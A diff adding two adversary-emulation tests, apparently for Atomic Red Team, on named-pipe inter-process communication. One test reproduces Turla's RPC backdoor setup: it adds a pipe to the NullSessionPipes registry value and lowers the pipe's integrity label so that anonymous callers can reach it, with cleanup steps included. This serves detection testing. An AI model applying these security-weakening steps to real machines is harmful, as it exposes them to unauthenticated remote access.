@@ -126,3 +126,97 @@ atomic_tests:
     command: |
       "PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 5
     name: command_prompt
+- name: Create Named Pipe
+  auto_generated_guid: 17521690-2183-460f-a182-5dfd6f9f0a7f
+  description: |
+    Creates a named pipe using PowerShell. Named pipes are a common inter-process communication mechanism
+    that adversaries use to facilitate data exchange between processes or as a command-and-control channel.
+  supported_platforms:
+  - windows
+  input_arguments:
+    pipe_name:
+      description: Name of the named pipe to create (without the \\.\pipe\ prefix)
+      type: string
+      default: atomic_pipe
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $pipe = New-Object System.IO.Pipes.NamedPipeServerStream("#{pipe_name}", [System.IO.Pipes.PipeDirection]::InOut)
+      Start-Sleep -Seconds 30
+      $pipe.Dispose()
+- name: Named Pipe Integrity Reduction for Turla's RPC backdoor
+  auto_generated_guid: 7a8f8ae9-6b1d-4f7b-88e7-9ea01234eee5
+  description: |
+    Emulates the server-side behavior of Turla's RPC backdoors. First checks to see if the named pipe atctl is in the
+    registry key for NullSessionPipes, and if so, modifies the security descriptor of the pipe to allow untrusted/anonymous
+    integrity level callers via SetSecurityInfo. Essentially allows unauthenticated users to have privileged RCE on the server machine through RPC.
+
+    Reference: https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/
+  supported_platforms:
+  - windows
+  input_arguments:
+    pipe_name:
+      description: Name of the named pipe to create
+      type: string
+      default: atctl
+  dependency_executor_name: powershell
+  dependencies:
+  - description: NullSessionPipes must contain the pipe name for the security descriptor to be set
+    prereq_command: |
+      $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
+      $current = (Get-ItemProperty -Path $regPath -Name "NullSessionPipes" -ErrorAction SilentlyContinue).NullSessionPipes
+      if ($current -contains "#{pipe_name}") { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
+      $current = (Get-ItemProperty -Path $regPath -Name "NullSessionPipes" -ErrorAction SilentlyContinue).NullSessionPipes
+      $updated = @($current) + "#{pipe_name}"
+      Set-ItemProperty -Path $regPath -Name "NullSessionPipes" -Value $updated -Type MultiString
+      New-Item -Type File "$env:TEMP\T1559_nullsession_added" -Force | Out-Null
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Add-Type @'
+      using System;
+      using System.IO.Pipes;
+      using System.Runtime.InteropServices;
+
+      public class TurlaPipe {
+          [DllImport("advapi32.dll", SetLastError = true)]
+          static extern uint SetSecurityInfo(SafeHandle handle, int objectType, int securityInformation, IntPtr owner, IntPtr group, IntPtr dacl, IntPtr sacl);
+
+          [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+          static extern bool ConvertStringSecurityDescriptorToSecurityDescriptorW(string sddl, uint revision, out IntPtr sd, out uint size);
+
+          [DllImport("advapi32.dll")]
+          static extern bool GetSecurityDescriptorSacl(IntPtr pSd, out bool present, out IntPtr pSacl, out bool defaulted);
+
+          [DllImport("kernel32.dll")]
+          static extern IntPtr LocalFree(IntPtr hMem);
+
+          public static void CreateAndSetLabel(string pipeName) {
+              var pipe = new NamedPipeServerStream(pipeName, PipeDirection.InOut);
+              IntPtr pSd;
+              uint sdSize;
+              ConvertStringSecurityDescriptorToSecurityDescriptorW("S:(ML;;NW;;;S-1-16-0)", 1, out pSd, out sdSize);
+              bool present, defaulted;
+              IntPtr pSacl;
+              GetSecurityDescriptorSacl(pSd, out present, out pSacl, out defaulted);
+              SetSecurityInfo(pipe.SafePipeHandle, 6, 0x10, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, pSacl);
+              LocalFree(pSd);
+              pipe.Dispose();
+          }
+      }
+      '@
+      [TurlaPipe]::CreateAndSetLabel("#{pipe_name}")
+    cleanup_command: |
+      if (Test-Path "$env:TEMP\T1559_nullsession_added") {
+        $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
+        $current = (Get-ItemProperty -Path $regPath -Name "NullSessionPipes" -ErrorAction SilentlyContinue).NullSessionPipes
+        if ($current -contains "#{pipe_name}") {
+          $updated = $current | Where-Object { $_ -ne "#{pipe_name}" }
+          Set-ItemProperty -Path $regPath -Name "NullSessionPipes" -Value $updated -Type MultiString
+        }
+      }
+      Remove-Item "$env:TEMP\T1559_nullsession_added" -Force -ErrorAction SilentlyContinue
